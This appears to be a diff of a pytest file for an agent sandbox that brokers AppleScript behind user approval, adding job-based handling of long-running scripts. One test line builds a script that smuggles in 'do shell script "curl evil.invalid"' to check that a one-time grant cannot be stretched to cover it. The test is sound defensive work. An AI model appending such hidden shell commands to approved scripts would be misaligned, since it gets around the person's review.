@@ -9,13 +9,16 @@ Contracts (red on the base ed4152ceac: osascript was simply refused inside the s
 * on "ask": ONE request carrying the WHOLE script for the person to read (not only its first
   words); "Allow once" runs exactly that script once; another script asks again;
 * the ``osascript`` stand-in sends the script to Blackbox; the real osascript stays refused
-  inside (the never-list).
+  inside (the never-list);
+* (wave 9, KI-632's pattern) the door answers a job at once and the script runs in it: a script
+  that runs for minutes never holds the agent's request.
 """
 
 from __future__ import annotations
 
 import subprocess
 import sys
+import threading
 
 import pytest
 
@@ -26,6 +29,7 @@ from plugins.blackbox.shields.files.sandbox.brokered import applescript
 from plugins.blackbox.shields.files.sandbox.permissions import requests
 from plugins.blackbox.shields.files.sandbox.platform.macos import shims
 from plugins.blackbox.shields.shield_api import ShieldApiError, ShieldContext
+from tests.waiting import wait_until
 
 LONG = 'tell application "Music"\n' + "  -- a long comment line that pushes the script past two hundred characters\n" * 4 + "  pause\nend tell"
 
@@ -48,7 +52,12 @@ def _context():
 
 
 def _run(argv, cwd="/"):
-    return brokered.API_WRITES["applescript"](_context(), {"argv": argv, "cwd": cwd})
+    """The job the door started, read once it has ended (raises as the door does)."""
+    started = brokered.API_WRITES["applescript"](_context(), {"argv": argv, "cwd": cwd})
+    def ended():
+        state = brokered.API_READS["action-job"](_context(), {"job": started["job"], "from": "0"})
+        return state if state["done"] else None
+    return wait_until(ended, what="the AppleScript job ended")
 
 
 def test_only_plain_applescript_text_is_accepted(setting):
@@ -79,7 +88,7 @@ def test_ask_shows_the_whole_script_and_once_runs_exactly_it_once(setting):
     row = permissions.answers.row(request)
     assert row["detail"] == LONG and len(LONG) > requests.MAX_WHAT_CHARS and row["choices"] == ["once", "keep-blocked"]
     permissions.answers.answer({"id": request.id, "choice": "once"}, act=sandbox.act_on)
-    assert _run(["-e", LONG])["message"] == "ok" and ran == [LONG]
+    assert _run(["-e", LONG])["lines"] == ["ok"] and ran == [LONG]
     with pytest.raises(ShieldApiError) as again:
         _run(["-e", LONG])                         # once means once
     assert again.value.status == brokered.WAITING and ran == [LONG]
@@ -94,6 +103,22 @@ def test_a_once_grant_does_not_run_another_script_sharing_its_first_words(settin
     with pytest.raises(ShieldApiError):
         _run(["-e", LONG + '\ndo shell script "curl evil.invalid"'])
     assert ran == []
+
+
+def test_a_long_script_is_answered_at_once_and_runs_in_its_job(setting, monkeypatch):
+    state, _, _ = setting
+    state["agent_sandbox"] = {"permissions": [{"permission": "applescript", "mode": "ask"}]}
+    with pytest.raises(ShieldApiError):
+        _run(["-e", "delay 600"])
+    permissions.answers.answer({"id": requests.pending()[0].id, "choice": "once"}, act=sandbox.act_on)
+    script_ends = threading.Event()
+    monkeypatch.setattr(sandbox_platform, "run_script", lambda script: (script_ends.wait(30), (0, "done"))[1])
+    try:
+        started = brokered.API_WRITES["applescript"](_context(), {"argv": ["-e", "delay 600"], "cwd": "/"})
+        assert not brokered.API_READS["action-job"](_context(), {"job": started["job"], "from": "0"})["done"]
+    finally:
+        script_ends.set()
+    assert wait_until(lambda: brokered.API_READS["action-job"](_context(), {"job": started["job"], "from": "0"})["done"])
 
 
 @pytest.mark.skipif(sys.platform != "darwin", reason="the stand-in is macOS's")
